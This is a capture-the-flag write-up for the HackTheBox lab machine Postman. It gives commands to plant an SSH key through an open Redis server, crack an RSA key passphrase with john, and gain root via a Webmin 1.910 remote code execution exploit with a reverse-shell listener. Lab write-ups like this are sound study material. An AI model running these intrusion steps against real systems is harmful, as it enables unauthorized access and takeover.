## Postman

Difficulty: Easy

### User Flag

#### Foothold

There is a redis port open. We can interact with it. Also, Webmin 1.910 is in port 10000, but this will be exploit lately.

```
rustscan -a 10.10.10.160 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/18ecdbc0-e1e0-42ad-8370-9daa73a12ce7)

![port10000](https://github.com/b1d0ws/OSCP/assets/58514930/0e87a547-2428-4b38-90c5-e5f02a1c2357)

<br>

Searching for how to exploit redis, hacktricks brings [this article](https://hacktricks.boitatech.com.br/pentesting/6379-pentesting-redis) showing a SSH Key manner to do it.

![redisSSH](https://github.com/b1d0ws/OSCP/assets/58514930/c277134e-0f93-4027-892f-166f0e82ef63)

<br>

```
redis-cli -h 10.85.0.52
CONFIG SET requirepass "mypass" 

ssh-keygen -t rsa -f kali
(echo -e "\n\n"; cat kali.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt | redis-cli -h 10.85.0.52 -a mypass -x set ssh_key

redis-cli -h 10.85.0.52
10.10.10.160:6379> AUTH mypass
OK
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK

ssh -i kali redis@10.10.10.160
```

![firstAccess](https://github.com/b1d0ws/OSCP/assets/58514930/9d212745-d876-42cc-b07e-08c4ea94fa82)

#### User Access

LinPeas return to us that a rsa key exists inside /opt.  

Crack the password of this key with jhon and you can use it as Matt user.

```
ssh2john matt.rsa > mattHash 
john mattHash --wordlist=/usr/share/wordlists/rockyou.txt
```

![optKey](https://github.com/b1d0ws/OSCP/assets/58514930/0c166507-a694-47d1-b567-76f2f2ad1383)

![mattHashCrack](https://github.com/b1d0ws/OSCP/assets/58514930/4734be05-44d5-467c-82fd-cf59712c6695)

### Root Flag

We can use Matt credentials to login in Webmin and exploit a RCE vulnerability with metasploit.  

Remember to set SSL to true in metasploit module.

![searchsploit](https://github.com/b1d0ws/OSCP/assets/58514930/a5731014-6cff-44a7-b851-f66081da19ac)

![webmin](https://github.com/b1d0ws/OSCP/assets/58514930/e258107a-c79a-4e21-aa38-e7ed5746f17e)

![metasploitConfig](https://github.com/b1d0ws/OSCP/assets/58514930/94464c88-5ac7-4ff8-8ed1-900f00f236e2)

![rootShell](https://github.com/b1d0ws/OSCP/assets/58514930/2a628577-7573-474a-8b3a-9e1aa0e47712)

<br>

There is also a public exploit on Git that can be used instead of metasploit.

```
python3 exploit_poc.py --ip_address=postman --port=10000 --lhost=10.10.14.11 --lport=3333 --user=Matt --pass=computer2008
```

![alternativeExploit](https://github.com/b1d0ws/OSCP/assets/58514930/2ffd05b2-3823-419a-a8b0-ed870dc45dae)
